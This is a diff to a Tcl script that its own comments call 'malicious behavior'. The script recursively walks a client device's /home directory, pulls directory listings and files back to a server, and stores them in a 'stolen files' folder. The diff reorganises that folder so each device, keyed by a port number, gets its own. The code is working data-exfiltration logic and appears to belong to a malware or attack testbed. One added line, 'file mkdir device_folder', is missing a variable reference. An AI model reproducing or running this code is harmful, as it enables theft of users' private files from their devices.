@@ -92,7 +92,8 @@ proc traverse {dir stolen_files_folder config_folder_remote config_folder_local}
 	sleep 5
 
 		# pull ls output file from client and store it locally
-		set ls_result_local "$config_folder_local/ls_result.txt"
+		global tick_port
+		set ls_result_local "$config_folder_local/ls_result_$tick_port.txt"
 		file_pull $ls_result_remote $ls_result_local
 		sleep 3
 		set file [open $ls_result_local]
@@ -139,13 +140,18 @@ proc traverse {dir stolen_files_folder config_folder_remote config_folder_local}
 
 # runs indefinitely, script is stopped when fp has completed on client device
 while {1 > 0} {
+
+	# create a folder for the files of the device
+	set device_folder "$stolen_files_storage_folder/$tick_port"
+	file mkdir device_folder
+	
 	# the malicious behavior starts stealing data in the '/home' directory
 	# to store the data the folders are mirrored on the server
 	set starting_folder "/home"
-	set first_stolen_folder $stolen_files_storage_folder$starting_folder
+	set first_stolen_folder $device_folder$starting_folder
 	file mkdir $first_stolen_folder
-
+	
 	# start malicious behavior
-	traverse $starting_folder $stolen_files_storage_folder $client_config_folder "$root_of_application_on_server/config"
+	traverse $starting_folder $device_folder $client_config_folder "$root_of_application_on_server/config"
 }
 
